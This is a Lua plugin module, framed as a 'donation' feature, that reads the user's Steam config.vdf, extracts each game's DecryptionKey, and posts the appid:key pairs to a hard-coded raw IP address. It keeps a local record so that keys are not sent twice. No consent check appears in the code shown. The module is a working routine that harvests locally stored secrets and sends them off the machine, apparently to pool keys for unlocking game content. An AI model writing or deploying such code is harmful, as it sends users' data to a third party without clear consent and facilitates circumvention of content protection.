local m_utils = require("utils")
local fs = require("fs")
local http_client = require("http_client")
local config = require("config")
local logger = require("plugin_logger")
local paths = require("paths")
local steam_utils = require("steam_utils")
local datetime = require("datetime")

local DONATED_APPIDS_FILE = paths.backend_path("data/donatedappids.txt")
local DONATION_URL = "http://167.235.229.108/donatekeys/send"

local function _parse_vdf_simple(content)
    local result = {}
    local stack = {result}
    local current_key = nil

    local pos = 1
    local len = #content
    
    while pos <= len do
        local c = content:sub(pos, pos)
        if c == '/' and content:sub(pos+1, pos+1) == '/' then
            local nl = content:find("\n", pos)
            pos = nl or (len + 1)
        elseif c == '"' then
            local end_quote = content:find('"', pos + 1)
            if end_quote then
                local token = content:sub(pos + 1, end_quote - 1)
                pos = end_quote + 1
                
                if current_key == nil then
                    current_key = token
                else
                    stack[#stack][current_key] = token
                    current_key = nil
                end
            else
                break
            end
        elseif c == '{' then
            if current_key then
                local new_dict = {}
                stack[#stack][current_key] = new_dict
                table.insert(stack, new_dict)
                current_key = nil
            end
            pos = pos + 1
        elseif c == '}' then
            if #stack > 1 then
                table.remove(stack)
            end
            pos = pos + 1
        else
            pos = pos + 1
        end
    end
    
    return result
end

local function _load_donated_appids()
    if not fs.exists(DONATED_APPIDS_FILE) then return {} end
    local content = m_utils.read_file(DONATED_APPIDS_FILE)
    if not content then return {} end
    local set = {}
    for line in content:gmatch("[^\r\n]+") do
        local t = line:match("^%s*(.-)%s*$")
        if t and t ~= "" and not t:match("^DATE:") then
            set[t] = true
        end
    end
    return set
end

local function _check_cache_staleness()
    local today = datetime.unix()
    
    if not fs.exists(DONATED_APPIDS_FILE) then
        local dir = fs.parent_path(DONATED_APPIDS_FILE)
        if not fs.exists(dir) then fs.create_directories(dir) end
        m_utils.write_file(DONATED_APPIDS_FILE, "DATE:" .. tostring(today) .. "\n")
        return
    end

    local content = m_utils.read_file(DONATED_APPIDS_FILE)
    if not content then return end
    local first_line = content:match("^[^\r\n]+") or ""

    local wipe = false
    if first_line:match("^DATE:") then
        local date_str = first_line:sub(6)
        local cached_time = tonumber(date_str)
        if cached_time then
            local diff = today - cached_time
            if diff >= (7 * 24 * 60 * 60) then
                wipe = true
            end
        else
            wipe = true
        end
    else
        wipe = true
    end

    if wipe then
        m_utils.write_file(DONATED_APPIDS_FILE, "DATE:" .. tostring(today) .. "\n")
    end
end

local function _save_donated_appids(appids_set)
    local sorted = {}
    for k in pairs(appids_set) do table.insert(sorted, k) end
    table.sort(sorted)
    local append_str = ""
    for _, appid in ipairs(sorted) do
        append_str = append_str .. appid .. "\n"
    end
    m_utils.append_file(DONATED_APPIDS_FILE, append_str)
end

local function validate_appid_key_pair(appid, key)
    if type(appid) ~= "string" or type(key) ~= "string" then return false end
    if not appid:match("^%d+$") or #appid > 10 then return false end
    if #key ~= 64 or not key:match("^[a-zA-Z0-9]+$") then return false end
    return true
end

local function parse_config_vdf_decryption_keys(steam_path)
    local config_path = fs.join(steam_path, "config", "config.vdf")
    if not fs.exists(config_path) then return {} end

    local content = m_utils.read_file(config_path)
    if not content then return {} end

    local vdf_data = _parse_vdf_simple(content)
    local pairs = {}

    local function find_keys(data)
        for k, v in pairs(data) do
            if type(v) == "table" then
                if v["DecryptionKey"] and type(v["DecryptionKey"]) == "string" then
                    table.insert(pairs, { appid = tostring(k), key = v["DecryptionKey"] })
                else
                    find_keys(v)
                end
            end
        end
    end
    find_keys(vdf_data)
    return pairs
end

local function extract_valid_decryption_keys(steam_path)
    if not steam_path or steam_path == "" or not fs.exists(steam_path) then
        return {}
    end
    
    local all_pairs = parse_config_vdf_decryption_keys(steam_path)
    local valid_pairs = {}
    for _, pair in ipairs(all_pairs) do
        if validate_appid_key_pair(pair.appid, pair.key) then
            table.insert(valid_pairs, pair)
        end
    end
    return valid_pairs
end

local donate_keys = {}

function donate_keys.send_donation_keys(pairs_list)
    if not pairs_list or #pairs_list == 0 then return false end
    _check_cache_staleness()

    local already_donated = _load_donated_appids()
    local new_pairs = {}
    for _, pair in ipairs(pairs_list) do
        if not already_donated[pair.appid] then
            table.insert(new_pairs, pair)
        end
    end

    if #new_pairs == 0 then return true end

    local formatted = {}
    local new_appids_set = {}
    for _, pair in ipairs(new_pairs) do
        table.insert(formatted, pair.appid .. ":" .. pair.key)
        new_appids_set[pair.appid] = true
    end
    local payload = table.concat(formatted, ",")

    local headers = {
        ["Content-Type"] = "text/plain",
        ["User-Agent"] = config.USER_AGENT
    }

    local resp = http_client.post(DONATION_URL, { headers = headers, data = payload, timeout = 15 })
    if resp and resp.status == 200 then
        _save_donated_appids(new_appids_set)
        return true
    end
    return false
end

-- Export utilities for testability if needed
donate_keys.extract_valid_decryption_keys = extract_valid_decryption_keys

return donate_keys
